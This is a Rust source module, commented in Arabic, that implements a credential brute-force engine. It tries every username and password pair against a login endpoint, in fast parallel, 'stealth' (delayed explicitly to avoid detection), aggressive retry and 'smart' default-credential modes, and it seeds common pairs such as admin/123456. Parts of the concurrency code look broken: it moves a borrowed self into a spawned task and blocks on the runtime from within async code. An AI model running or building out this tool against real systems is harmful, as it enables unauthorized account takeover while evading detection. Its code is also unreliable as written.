//! محرك التخمين السريع
//! يوفر خوارزميات متقدمة للتخمين السريع

use std::sync::Arc;
use std::time::{Instant, Duration};
use dashmap::DashMap;
use rayon::prelude::*;
use tokio::sync::mpsc;
use anyhow::{Result, Context};
use parking_lot::RwLock;

use crate::http_client::HttpClient;
use crate::scanner::ScanResult;

/// وضع الهجوم
#[derive(Debug, Clone, Copy, PartialEq, serde::Serialize)]
pub enum AttackMode {
    /// أقصى سرعة
    Fast,
    /// متوازن
    Normal,
    /// خفي
    Stealth,
    /// عدواني مع إعادة محاولة
    Aggressive,
}

/// محرك التخمين
pub struct Bruteforcer {
    client: Arc<HttpClient>,
    users: Vec<String>,
    passwords: Vec<String>,
    max_workers: usize,
    rate_limit: Option<u32>,
    results: Arc<DashMap<String, ScanResult>>,
}

impl Bruteforcer {
    /// إنشاء محرك جديد
    pub fn new(
        client: Arc<HttpClient>,
        users: Vec<String>,
        passwords: Vec<String>,
        max_workers: usize,
    ) -> Self {
        Self {
            client,
            users,
            passwords,
            max_workers,
            rate_limit: None,
            results: Arc::new(DashMap::new()),
        }
    }
    
    /// تعيين حد المعدل
    pub fn set_rate_limit(&mut self, requests_per_second: u32) {
        self.rate_limit = Some(requests_per_second);
    }
    
    /// تشغيل الهجوم حسب الوضع
    pub async fn attack(&self, mode: AttackMode) -> Result<Vec<ScanResult>> {
        match mode {
            AttackMode::Fast => self.attack_fast().await,
            AttackMode::Normal => self.attack_normal().await,
            AttackMode::Stealth => self.attack_stealth().await,
            AttackMode::Aggressive => self.attack_aggressive().await,
        }
    }
    
    /// هجوم سريع (متوازي بالكامل)
    async fn attack_fast(&self) -> Result<Vec<ScanResult>> {
        let start = Instant::now();
        let total = self.users.len() * self.passwords.len();
        
        println!("[+] بدء الهجوم السريع: {} محاولة", total);
        
        #[cfg(feature = "rayon")]
        let results: Vec<ScanResult> = self.users
            .par_iter()
            .flat_map(|username| {
                self.passwords.par_iter().map(|password| {
                    self.test_pair(username, password)
                })
            })
            .collect();
        
        #[cfg(not(feature = "rayon"))]
        let results = self.attack_normal().await?;
        
        let duration = start.elapsed();
        println!(
            "[+] اكتمل في {:.2?} ({:.0} محاولة/ثانية)",
            duration,
            total as f64 / duration.as_secs_f64()
        );
        
        Ok(results)
    }
    
    /// هجوم عادي (باستخدام Tokio)
    async fn attack_normal(&self) -> Result<Vec<ScanResult>> {
        let (tx, mut rx) = mpsc::channel(1000);
        let client = Arc::clone(&self.client);
        
        // إنتاج المهام
        let producer = tokio::spawn(async move {
            for username in &self.users {
                for password in &self.passwords {
                    let tx = tx.clone();
                    let client = Arc::clone(&client);
                    let u = username.clone();
                    let p = password.clone();
                    
                    tokio::spawn(async move {
                        let result = client.test_login(&u, &p).await;
                        let _ = tx.send((u, p, result)).await;
                    });
                }
            }
        });
        
        // استهلاك النتائج
        let mut results = Vec::new();
        while let Some((username, password, result)) = rx.recv().await {
            let scan_result = match result {
                Ok(response) => ScanResult {
                    username,
                    password,
                    success: response.status().is_success(),
                    status_code: response.status().as_u16(),
                    response_time: Duration::default(),
                    error: None,
                    timestamp: chrono::Utc::now(),
                },
                Err(_) => ScanResult {
                    username,
                    password,
                    success: false,
                    status_code: 0,
                    response_time: Duration::default(),
                    error: Some("فشل".to_string()),
                    timestamp: chrono::Utc::now(),
                },
            };
            
            results.push(scan_result);
        }
        
        let _ = producer.await;
        Ok(results)
    }
    
    /// هجوم خفي (ببطء)
    async fn attack_stealth(&self) -> Result<Vec<ScanResult>> {
        let mut results = Vec::new();
        let delay = Duration::from_millis(500); // تأخير كبير
        
        for username in &self.users {
            for password in &self.passwords {
                match self.client.test_login(username, password).await {
                    Ok(response) => {
                        results.push(ScanResult {
                            username: username.clone(),
                            password: password.clone(),
                            success: response.status().is_success(),
                            status_code: response.status().as_u16(),
                            response_time: Duration::default(),
                            error: None,
                            timestamp: chrono::Utc::now(),
                        });
                    }
                    Err(_) => {
                        results.push(ScanResult {
                            username: username.clone(),
                            password: password.clone(),
                            success: false,
                            status_code: 0,
                            response_time: Duration::default(),
                            error: Some("فشل".to_string()),
                            timestamp: chrono::Utc::now(),
                        });
                    }
                }
                
                // تأخير طويل لتجنب الاكتشاف
                tokio::time::sleep(delay).await;
            }
        }
        
        Ok(results)
    }
    
    /// هجوم عدواني (مع إعادة محاولة)
    async fn attack_aggressive(&self) -> Result<Vec<ScanResult>> {
        let mut results = Vec::new();
        let retries = 3;
        
        for username in &self.users {
            for password in &self.passwords {
                let mut last_error = None;
                
                for attempt in 0..retries {
                    match self.client.test_login(username, password).await {
                        Ok(response) => {
                            results.push(ScanResult {
                                username: username.clone(),
                                password: password.clone(),
                                success: response.status().is_success(),
                                status_code: response.status().as_u16(),
                                response_time: Duration::default(),
                                error: None,
                                timestamp: chrono::Utc::now(),
                            });
                            break;
                        }
                        Err(e) => {
                            last_error = Some(e);
                            if attempt < retries - 1 {
                                tokio::time::sleep(Duration::from_millis(100)).await;
                            }
                        }
                    }
                }
                
                if let Some(e) = last_error {
                    results.push(ScanResult {
                        username: username.clone(),
                        password: password.clone(),
                        success: false,
                        status_code: 0,
                        response_time: Duration::default(),
                        error: Some(e.to_string()),
                        timestamp: chrono::Utc::now(),
                    });
                }
            }
        }
        
        Ok(results)
    }
    
    /// اختبار زوج واحد
    fn test_pair(&self, username: &str, password: &str) -> ScanResult {
        let start = Instant::now();
        
        // استخدام قناة Tokio غير متزامنة
        let rt = tokio::runtime::Handle::current();
        
        let result = rt.block_on(async {
            match self.client.test_login(username, password).await {
                Ok(response) => ScanResult {
                    username: username.to_string(),
                    password: password.to_string(),
                    success: response.status().is_success(),
                    status_code: response.status().as_u16(),
                    response_time: start.elapsed(),
                    error: None,
                    timestamp: chrono::Utc::now(),
                },
                Err(e) => ScanResult {
                    username: username.to_string(),
                    password: password.to_string(),
                    success: false,
                    status_code: 0,
                    response_time: start.elapsed(),
                    error: Some(e.to_string()),
                    timestamp: chrono::Utc::now(),
                },
            }
        });
        
        // تخزين النتيجة
        let key = format!("{}:{}", username, password);
        self.results.insert(key, result.clone());
        
        result
    }
    
    /// هجوم ذكي (يجرب الأكثر شيوعًا أولاً)
    pub async fn smart_attack(&self) -> Result<Vec<ScanResult>> {
        println!("[+] بدء الهجوم الذكي");
        
        // فرز كلمات المرور حسب الشهرة (إذا كانت معلومة)
        let mut passwords = self.passwords.clone();
        
        // يمكن إضافة منطق الفرز هنا
        // مثلاً: تجربة كلمات المرور القصيرة أولاً
        
        let mut results = Vec::new();
        
        // تجربة المجموعات الشائعة أولاً
        let common_users = ["admin", "administrator", "root", "user", "test"];
        let common_passwords = ["admin", "123456", "password", "12345678", "123456789"];
        
        for username in common_users.iter() {
            if self.users.contains(&username.to_string()) {
                for password in common_passwords.iter() {
                    if passwords.contains(&password.to_string()) {
                        match self.client.test_login(username, password).await {
                            Ok(response) => {
                                if response.status().is_success() {
                                    results.push(ScanResult {
                                        username: username.to_string(),
                                        password: password.to_string(),
                                        success: true,
                                        status_code: response.status().as_u16(),
                                        response_time: Duration::default(),
                                        error: None,
                                        timestamp: chrono::Utc::now(),
                                    });
                                }
                            }
                            Err(_) => {}
                        }
                    }
                }
            }
        }
        
        // استكمال الهجوم العادي
        let normal_results = self.attack_normal().await?;
        results.extend(normal_results);
        
        Ok(results)
    }
}